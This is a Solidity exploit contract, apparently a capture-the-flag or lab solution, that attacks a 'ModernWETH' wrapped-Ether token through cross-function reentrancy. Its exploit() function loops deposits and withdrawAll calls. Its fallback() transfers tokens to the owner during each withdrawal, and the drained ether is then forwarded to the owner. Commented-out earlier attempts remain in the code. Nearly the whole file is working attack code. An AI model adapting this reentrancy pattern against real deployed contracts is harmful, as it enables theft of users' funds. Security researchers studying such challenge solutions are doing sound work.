// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {ReentrancyGuard} from "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ModernWETH} from "./ModernWETH.sol";
import "forge-std/console.sol";

/**
 * @title ModernWETH: The Insecure Modern Wrapped Ether
 */
contract ModernWETHExploit {
    address public mEth; 
    ModernWETH public modernWETH;
    address public owner;

    constructor(address _mEth) payable {
        mEth = _mEth;
        modernWETH = ModernWETH(_mEth);
        owner = msg.sender;
    }

    // function exploit() payable{
    //     for (uint i = 0; i < 10; i++) {
    //         modernWETH.deposit{value: msg.value}();
    //         modernWETH.approve(owner, msg.value);
    //         console.logUint(modernWETH.totalSupply());
    //         modernWETH.withdrawAll();
    //     }
    // }
    // There is a crossu function reentrancy attack
    function exploit() external payable {
        for (uint i = 0; i < 100; i++) {
            modernWETH.deposit{value: 10 ether}();
            modernWETH.withdrawAll();
        }

        owner.call{value: address(this).balance}("");
    }

    fallback() external payable {
        // ModernWETH(mEth)._burn(msg.sender, msg.sender.balance);
        // modernWETH.deposit{value: msg.value}();
        // modernWETH.approve(owner, 10 ether);
        modernWETH.transfer( owner, 10 ether );
        // modernWETH.increaseAllowance(owner, 10 ether); 
        // console.logUint(modernWETH.allowance(address(this), owner));
        // console.logUint(modernWETH.totalSupply());
        // ModernWETH(mEth).withdrawAll();
    }

}
